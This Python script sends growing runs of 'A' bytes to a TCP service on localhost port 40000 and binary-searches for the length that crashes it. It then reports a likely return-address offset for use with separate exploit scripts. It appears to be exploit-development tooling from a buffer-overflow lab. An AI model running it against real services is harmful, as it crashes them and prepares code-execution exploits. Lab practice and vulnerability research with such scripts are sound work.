#!/usr/bin/env python3

import socket
import struct
import sys

# Default target information
TARGET_HOST = '127.0.0.1'
TARGET_PORT = 40000  # The port where the segmentation fault was observed

# Buffer size in the vulnerable program
BUFFER_SIZE = 128

def send_payload(size):
    """Send a payload of specific size and report the result"""
    # Create a payload of the specified size
    payload = b"A" * size
    
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}")
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # Send the payload
        print(f"[*] Sending {size} bytes")
        s.send(payload)
        
        # Try to receive data (may not happen if exploit works)
        try:
            response = s.recv(1024)
            print(f"[*] Received response: {len(response)} bytes")
            return False  # No crash
        except:
            print("[*] No response received - possible crash")
            return True  # Possible crash
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return True  # Connection error - possible crash
    finally:
        # Close the socket
        s.close()

def binary_search_crash_point(min_size=128, max_size=600, step=4):
    """Use binary search to find the exact crash point"""
    print(f"[*] Searching for crash point between {min_size} and {max_size} bytes")
    
    # First verify that min_size doesn't crash and max_size does crash
    min_crashes = send_payload(min_size)
    if min_crashes:
        print(f"[!] Unexpected: Server crashes with minimum size {min_size}")
        return min_size
    
    max_crashes = send_payload(max_size)
    if not max_crashes:
        print(f"[!] Unexpected: Server doesn't crash with maximum size {max_size}")
        return -1
    
    # Now perform binary search
    while max_size - min_size > step:
        mid_size = (min_size + max_size) // 2
        # Make sure mid_size is a multiple of 4 (word alignment)
        mid_size = (mid_size // 4) * 4
        
        print(f"\n[*] Testing size: {mid_size}")
        crashes = send_payload(mid_size)
        
        if crashes:
            max_size = mid_size
        else:
            min_size = mid_size
    
    # Final verification
    for size in range(min_size, max_size + 1, step):
        print(f"\n[*] Final verification with size: {size}")
        crashes = send_payload(size)
        if crashes:
            print(f"[+] Found exact crash point at {size} bytes")
            return size
    
    return max_size

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "exact":
        # Find the exact crash point
        crash_point = binary_search_crash_point()
        if crash_point > 0:
            print(f"\n[+] The server crashes when sending {crash_point} bytes")
            print(f"[+] The offset to the return address is likely around {crash_point - 4} bytes")
            print("[*] Use this information with the exploit scripts to craft a precise payload")
    else:
        # Simple test with 516 bytes (the observed crash point)
        print("[*] Testing with 516 bytes (the observed crash point)")
        crashes = send_payload(516)
        if crashes:
            print("[+] Confirmed: Server crashes with 516 bytes")
            print("[*] For more precise analysis, run: python3 analyze-segfault.py exact")
        else:
            print("[!] Unexpected: Server doesn't crash with 516 bytes")
            print("[*] Try running with different payload sizes")

if __name__ == "__main__":
    print("Buffer Overflow Crash Analysis for tcpserver-basic on port 40000")
    print("----------------------------------------------------------")
    print("[!] This script helps determine the exact point where the server crashes")
    print("[!] Make sure the server is running before each test")
    main()